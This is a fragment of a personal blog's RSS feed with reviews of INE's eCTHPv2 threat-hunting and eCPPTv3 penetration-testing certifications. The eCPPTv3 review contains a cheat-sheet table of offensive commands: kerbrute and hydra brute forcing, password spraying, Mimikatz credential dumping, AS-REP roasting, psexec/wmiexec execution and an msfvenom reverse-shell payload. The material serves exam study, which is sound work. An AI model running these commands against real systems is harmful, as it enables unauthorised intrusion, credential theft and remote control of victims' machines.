+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="exam-details"&gt;Exam Details
+&lt;/h3&gt;&lt;p&gt;The eCTHPv2 exam consists of three &lt;strong&gt;hands-on labs&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Splunk&lt;/strong&gt;: For log monitoring and network traffic analysis.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Volatility&lt;/strong&gt;: For forensics and memory analysis.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ELK (Elastic)&lt;/strong&gt;: For system log management and analysis.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After completing these labs, you have &lt;strong&gt;two days&lt;/strong&gt; to complete the exam and an additional &lt;strong&gt;two days&lt;/strong&gt; to submit the final report, which must detail your findings and conclusions from the hunting activities.&lt;/p&gt;
+&lt;h3 id="tips-for-success"&gt;Tips for Success
+&lt;/h3&gt;&lt;p&gt;Since you’re already familiar with &lt;strong&gt;Splunk&lt;/strong&gt; and &lt;strong&gt;ELK&lt;/strong&gt;, here are some focused tips:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Review the MITRE ATT&amp;amp;CK Framework&lt;/strong&gt;: Get well-acquainted with common attack techniques. This framework will support you in your report, especially when describing threat-hunting processes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Maximize Tool Knowledge&lt;/strong&gt;: Even if you know Splunk and ELK well, delve deeper into filtering techniques, regex for complex queries, and setting up customized dashboards and alerts.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Thorough Documentation&lt;/strong&gt;: During the labs, take meticulous notes. The final report should detail not just results but also your methodologies to demonstrate a structured approach.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Time Management&lt;/strong&gt;: Plan each lab’s activities and reserve time for report review to meet the certification’s strict deadlines.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Practice with Real Scenarios&lt;/strong&gt;: Aside from course materials, practice with realistic case studies to solidify your knowledge, especially in network and endpoint analysis.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA.png"
+width="1218"
+height="860"
+srcset="https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA_hu_137bdc2ff3afc845.png 480w, https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA_hu_3c6c74a728fa2bcd.png 1024w"
+loading="lazy"
+alt="eCTHP certification"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="339px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;INE&amp;rsquo;s eCTHPv2 provides significant hands-on experience in threat hunting, emphasizing proactive response to network and endpoint threats. By mastering tools like &lt;code&gt;Splunk&lt;/code&gt;, &lt;code&gt;Volatility&lt;/code&gt;, and &lt;code&gt;ELK&lt;/code&gt;, this certification enhances your ability to detect and analyze anomalies in an enterprise setting.
+The hands-on labs and structured threat-hunting techniques make it a comprehensive choice for anyone serious about advancing their skills in cybersecurity and threat detection.&lt;/p&gt;</description></item><item><title>Certified Professional Penetration Tester (eCPPTv3) - INE</title><link>https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/</link><pubDate>Tue, 28 Jan 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/</guid><description>&lt;h1 id="certified-professional-penetration-tester-ecpptv3---ine"&gt;Certified Professional Penetration Tester (eCPPTv3) - INE
+&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;Certified Professional Penetration Tester (eCPPTv3)&lt;/strong&gt; by INE is a practical certification designed for professionals specializing in penetration testing and ethical hacking. This certification is ideal for those looking to deepen their skills in identifying and mitigating security vulnerabilities.&lt;/p&gt;
+&lt;p&gt;The certification is priced at &lt;strong&gt;400$&lt;/strong&gt; and includes a practical exam lasting &lt;strong&gt;24 hours&lt;/strong&gt;, during which you are required to complete penetration testing activities and answer 45 questions based on your findings.&lt;/p&gt;
+&lt;p&gt;This review includes personal notes and an example of the methodologies applied during the exam.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;In this section, I’ve included some of my notes to help guide others studying for the eCPPTv3 certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCPPT Notes&lt;/strong&gt; → &lt;a class="link" href="https://robertodandrea.notion.site/eCPPT-Certification-a979ec3064e34ed6bb9690efd8ffd176?pvs=74" target="_blank" rel="noopener"
+&gt;eCPPT Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="exam-structure"&gt;&lt;strong&gt;Exam Structure:&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;The exam is divided into two main components:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Lab Environment&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;You will be provided with a virtual environment containing various systems, including Linux and Windows hosts, such as Windows servers acting as Domain Controllers.&lt;/li&gt;
+&lt;li&gt;Your objective is to identify and exploit vulnerabilities within this environment to gain unauthorized access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Lab Questions&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;After compromising the environment, you will answer 45 questions related to your activities and findings during the penetration test.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The exam is to be completed within &lt;strong&gt;24 hours&lt;/strong&gt;, and you are required to submit your answers to the questions within this timeframe. Unlike previous versions, there is no requirement to submit a detailed report of your activities and findings.&lt;/p&gt;
+&lt;h3 id="exam-objectives"&gt;&lt;strong&gt;Exam Objectives:&lt;/strong&gt;
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Information Gathering &amp;amp; Reconnaissance (10%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform host discovery and port scanning on target networks.&lt;/li&gt;
+&lt;li&gt;Enumerate information from services running on open ports.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Initial Access (15%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform username enumeration to identify valid user accounts on target systems.&lt;/li&gt;
+&lt;li&gt;Perform password spraying attacks to identify valid credentials for initial access.&lt;/li&gt;
+&lt;li&gt;Perform brute-force attacks on remote access services for initial access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Web Application Penetration Testing (15%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform web application enumeration to identify potential vulnerabilities and misconfigurations.&lt;/li&gt;
+&lt;li&gt;Identify and exploit common web application vulnerabilities for initial access (e.g., SQL injection, cross-site scripting, command injection).&lt;/li&gt;
+&lt;li&gt;Perform brute-force attacks against login forms.&lt;/li&gt;
+&lt;li&gt;Exploit vulnerable and outdated web application components.&lt;/li&gt;
+&lt;li&gt;Exfiltrate data and credentials from compromised web applications and databases.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploitation &amp;amp; Post-Exploitation (25%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Identify and exploit vulnerabilities or misconfigurations in services.&lt;/li&gt;
+&lt;li&gt;Identify and exploit privilege escalation vulnerabilities.&lt;/li&gt;
+&lt;li&gt;Dump and crack password hashes.&lt;/li&gt;
+&lt;li&gt;Identify insecurely stored credentials.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploit Development (5%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Develop or modify exploit code for initial access and post-exploitation.&lt;/li&gt;
+&lt;li&gt;Identify and exploit memory corruption vulnerabilities (e.g., stack overflow, buffer overflow).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Active Directory Penetration Testing (30%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform information gathering on Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform enumeration attacks on Active Directory.&lt;/li&gt;
+&lt;li&gt;Exploit Active Directory vulnerabilities.&lt;/li&gt;
+&lt;li&gt;Perform privilege escalation attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform lateral movement attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform persistence attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform data exfiltration attacks in Active Directory.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="personal-tips-for-success"&gt;Personal Tips for Success
+&lt;/h3&gt;&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;This certification, in my experience, presents a medium-to-high difficulty level, especially if you are not familiar with Active Directory (AD). The exam focuses significantly on AD exploitation techniques, making it essential to have a solid understanding of AD environments.&lt;/p&gt;
+&lt;p&gt;To enhance your preparation, engaging with platforms like &lt;a class="link" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener"
+&gt;**GOAD&lt;/a&gt; (Game of Active Directory)** can be highly beneficial. GOAD provides a vulnerable AD environment, ideal for practicing common attack techniques. Detailed documentation and guides on tackling GOAD challenges are available on Mayfly277&amp;rsquo;s website.&lt;/p&gt;
+&lt;p&gt;Additionally, platforms such as &lt;strong&gt;Hack The Box&lt;/strong&gt; offer practical labs that can be extremely useful. Specifically, the machines &lt;strong&gt;SAUNA&lt;/strong&gt;, &lt;strong&gt;ACTIVE&lt;/strong&gt;, and &lt;strong&gt;TIMELAPSE&lt;/strong&gt; are designed to practice AD exploitation techniques. These labs allow you to refine your skills in a controlled and challenging environment.&lt;/p&gt;
+&lt;p&gt;Another valuable resource is the mind map provided by Orange Cyberdefense, which offers a clear overview of AD penetration testing techniques.
+This mind map will help you visualize the various phases and tools necessary to approach the exam successfully.&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank" rel="noopener"
+&gt;https://orange-cyberdefense.github.io/ocd-mindmaps/&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="table-of-useful-command"&gt;Table of useful command
+&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;Tool&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;cmd&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;kerbrute&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enumerate / brute force / password spray&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Enumeration:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;kerbrute userenum -d example.local &amp;ndash;dc 192.168.1.10 users.txt&lt;/em&gt;&lt;br&gt;&lt;strong&gt;BruteForce:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;kerbrute bruteuser -d example.local &amp;ndash;dc 192.168.1.10 administrator passwords.txt&lt;/em&gt;&lt;br&gt;&lt;strong&gt;User list file:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;users.txt&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;crackmapexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enum hosts&lt;br&gt;Enum null session&lt;br&gt;Enum anonymous access&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Get password Policy:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme &lt;IP&gt; -u ‘user’ -p ‘password’ &amp;ndash;pass-pol&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Username but NO pwd:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme smb &amp;lt;dc_ip&amp;gt; -u user.txt -p password.txt &amp;ndash;no-bruteforce&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Valid Credential:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme smb &lt;IP&gt; -u &lt;user&gt; -p &amp;lsquo;&amp;lt;password_from_before&amp;gt;&amp;rsquo; &amp;ndash;users&lt;/em&gt;&lt;br&gt;&lt;em&gt;cme smb &lt;IP&gt; -u &lt;user&gt; -p &amp;lsquo;&amp;lt;password_from_before&amp;gt;&amp;rsquo; &amp;ndash;shares&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Enumeration:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt; -u &amp;lsquo;a&amp;rsquo; -p &amp;lsquo;&amp;rsquo;&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;evil-winrm&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to target machine&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;evil-winrm -i 192.168.1.100 -u Administrator -p &amp;lsquo;Password123&amp;rsquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;xfreerdp&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to target machine&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;xfreerdp /v:192.168.1.100 /u:Administrator /p:&amp;lsquo;Password123&amp;rsquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;smbclient&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to SMB/CIFS resource&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;Password123&gt;@&lt;IP&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;smbclient -L //&amp;lt;dc_ip/&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;Enter-PSSession&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Start interactive session&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;Enter-PSSession &lt;domain&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;Enter-PSSession seclogs.resesarch.security.local&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;net&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Useful for policy settings&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;net accounts&lt;/em&gt;&lt;br&gt;&lt;em&gt;net user administrator&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;runas&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to victim&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;runas.exe /user:administrator cmd&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;PowerView&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enumeration AD - Powersploit suite&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;AS-REP Roasting primary step:&lt;/strong&gt;&lt;br&gt;_Get-DomainUser&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;winpeas&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Identify misconfigurations, permissions, and vulnerabilities&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Privilege escalation:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;winpeas.exe&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;msfvenom&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to generate a reverse_tcp payload&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe &amp;gt; rTCP.exe&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Metasploit module&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;msfconsole -q&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Meterpreter session:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;exploit/windows/misc/hta_server&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;Mimikatz&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a class="link" href="https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/" target="_blank" rel="noopener"
+&gt;https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;hashdump:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;hashdump&lt;/em&gt;&lt;br&gt;Return NTLM Hash of the user&lt;br&gt;&lt;strong&gt;creds_all:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;creds:all&lt;/em&gt;&lt;br&gt;Extract all possible hashes or credentials&lt;br&gt;&lt;strong&gt;lsa_dump_secrets:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;lsa_dump_secrets&lt;/em&gt;&lt;br&gt;Extract credential stored into Local Security Authority&lt;br&gt;&lt;strong&gt;lsa_dump_sam:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;lsa_dump_sam&lt;/em&gt;&lt;br&gt;Extract Security Account Manager and dumps credentials for local accounts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;psexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Execute command on target machine&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;psexec \\&amp;lt;target_ip&amp;gt; &amp;lt;cmd_command&amp;gt;&lt;/em&gt;&lt;br&gt;OR&lt;br&gt;Use for PTH&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;wmiexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to run command on target machine&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;python wmiexec.py username:password@target_ip &amp;ldquo;whoami&amp;rdquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fping&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Ping ICMP machines to get alive&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;fping -a -g 192.168.1.0/24&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;GetNPUsers&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to find hash&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;python GetNPUsers.py &lt;domain&gt;/ -userfile &amp;lt;username.txt&amp;gt; -format hashcat -outputfile &amp;lt;hash_out.txt&amp;gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;rebeus.exe asreproast /format:hashcat&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to crack hash&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;hashcat -m &lt;algorithm&gt; -a &amp;lt;type_of_attack&amp;gt; hash.txt&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;hydra&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Brute force&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;wpscan&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Wordpress vuln&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;nmap&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Port scanning&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;nmap -sC -sV -Pn -p- -oA output.txt &amp;lt;IP_addr&amp;gt; -vv&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA.png"
+width="1196"
+height="920"
+srcset="https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA_hu_60da1446b3c0eb65.png 480w, https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA_hu_7e2792e6e909694f.png 1024w"
+loading="lazy"
+alt="eCPPTv3 certification"
+class="gallery-image"
+data-flex-grow="130"
+data-flex-basis="312px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;The &lt;strong&gt;eCPPTv3 certification&lt;/strong&gt; offers cybersecurity professionals a valuable opportunity to deepen their expertise in penetration testing, particularly focusing on Active Directory environments. By engaging with hands-on labs and utilizing resources like &lt;strong&gt;GOAD&lt;/strong&gt; and &lt;strong&gt;Hack The Box&lt;/strong&gt;, candidates can develop practical skills essential for real-world security assessments. The exam&amp;rsquo;s emphasis on Active Directory exploitation reflects current security needs, highlighting the importance of mastering techniques to identify and mitigate risks associated with identity and access management within organizations.&lt;/p&gt;
+&lt;p&gt;Incorporating these resources into your preparation can enhance your understanding and proficiency in penetration testing, thereby increasing your chances of success in the eCPPTv3 exam.&lt;/p&gt;</description></item><item><title>Archives</title><link>https://robertodandrea.com/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/archives/</guid><description/></item><item><title>Links</title><link>https://robertodandrea.com/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/links/</guid><description>&lt;p&gt;To use this feature, add &lt;code&gt;links&lt;/code&gt; section to frontmatter.&lt;/p&gt;
+&lt;p&gt;This page&amp;rsquo;s frontmatter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;span class="lnt"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;links&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;GitHub&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;GitHub is the world&amp;#39;s largest software development platform.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;website&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://github.com&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;TypeScript&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span&gt;&lt;span class="w"&gt;
